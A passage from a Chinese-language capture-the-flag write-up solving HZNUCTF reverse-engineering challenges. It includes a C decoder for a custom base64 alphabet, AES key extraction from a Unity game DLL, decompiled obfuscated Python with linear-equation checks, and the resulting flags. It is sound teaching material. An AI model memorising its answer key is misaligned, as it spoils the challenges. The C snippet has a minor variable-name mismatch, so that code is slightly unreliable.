property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>input<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>base64_table <span class=\"token operator\">=</span> <span class=\"token string\">\"GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> reverse_table<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        reverse_table<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span>base64_table<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    size_t input_len <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    size_t padding <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>input_len <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> input<span class=\"token punctuation\">[</span>input_len <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'='</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        padding<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>input_len <span class=\"token operator\">></span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> input<span class=\"token punctuation\">[</span>input_len <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'='</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            padding<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    size_t output_len <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>input_len <span class=\"token operator\">*</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">4</span> <span class=\"token operator\">-</span> padding<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>output <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>output_len <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    output<span class=\"token punctuation\">[</span>output_len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> input_len <span class=\"token operator\">-</span> padding<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> b1<span class=\"token punctuation\">,</span> b2<span class=\"token punctuation\">,</span> b3<span class=\"token punctuation\">,</span> b4<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> v1 <span class=\"token operator\">=</span> reverse_table<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> v2 <span class=\"token operator\">=</span> reverse_table<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> v3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> input_len<span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> reverse_table<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> v4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> input_len<span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> reverse_table<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n        b1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">64</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        b2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">+</span> <span class=\"token number\">64</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        b3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">+</span> <span class=\"token number\">64</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        b4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v4 <span class=\"token operator\">></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">(</span>v4 <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>v4 <span class=\"token operator\">+</span> <span class=\"token number\">64</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;</span> output_len<span class=\"token punctuation\">)</span>\n            output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>b2 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;</span> output_len<span class=\"token punctuation\">)</span>\n            output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>b3 <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;</span> output_len<span class=\"token punctuation\">)</span>\n            output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b3 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> b4<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>output<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Enc<span class=\"token operator\">=</span> <span class=\"token string\">\"AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Decoded<span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span>Enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> Decoded<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>decoded<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}</p>\n<h3 id=\"水果忍者\"><a href=\"#水果忍者\" class=\"headerlink\" title=\"水果忍者\"></a>水果忍者</h3><p>主要dll目录：\\水果忍者\\Fruit Ninja_Data\\Managed\\Assembly-CSharp.dll</p>\n<p>拖入dnSpy分析，是AES CBC加密。</p>\n<p><img src=\"/images/1744633170177-5.png\" alt=\"img\"></p>\n<p>底下有密文、密钥、iv，直接解密即可。</p>\n<p><img src=\"/images/1744633170177-6.png\" alt=\"img\"></p>\n<p><img src=\"/images/1744633170177-7.png\" alt=\"img\"></p>\n<p>HZNUCTF{de20-70dd-4e62-b8d0-06e}</p>\n<h3 id=\"蛇年的本命语言\"><a href=\"#蛇年的本命语言\" class=\"headerlink\" title=\"蛇年的本命语言\"></a>蛇年的本命语言</h3><p>python程序解包得到pyc（python 3.8），使用uncompyle6解密得到代码。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> collections <span class=\"token keyword\">import</span> Counter\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to HZNUCTF!!!\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Plz input the flag:\"</span><span class=\"token punctuation\">)</span>\nooo0oOoooOOO0 <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\noOO0OoOoo000 <span class=\"token operator\">=</span> Counter<span class=\"token punctuation\">(</span>ooo0oOoooOOO0<span class=\"token punctuation\">)</span>\nO0o00 <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>oOO0OoOoo000<span class=\"token punctuation\">[</span>oOooo0OOO<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> oOooo0OOO <span class=\"token keyword\">in</span> ooo0oOoooOOO0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ans1: \"</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>O0o00<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> O0o00 <span class=\"token operator\">!=</span> <span class=\"token string\">\"111111116257645365477364777645752361\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong_wrong!!!\"</span><span class=\"token punctuation\">)</span>\n    exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\niiIII <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">for</span> oOooo0OOO <span class=\"token keyword\">in</span> ooo0oOoooOOO0<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> oOO0OoOoo000<span class=\"token punctuation\">[</span>oOooo0OOO<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        iiIII <span class=\"token operator\">+=</span> oOooo0OOO <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>oOO0OoOoo000<span class=\"token punctuation\">[</span>oOooo0OOO<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        oOO0OoOoo000<span class=\"token punctuation\">[</span>oOooo0OOO<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        i11i1Iii1I1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>oOooo0OOO<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> oOooo0OOO <span class=\"token keyword\">in</span> iiIII<span class=\"token punctuation\">]</span>\n        ii1iIi1i11i <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n         <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">504</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">403</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">799</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2938</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2042</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1225</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">11</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">33</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">44</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">55</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">77</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">7975</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">55</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">229</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">65</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">29</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2107</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">4037</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">59</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">56</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">122</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">32</span> <span 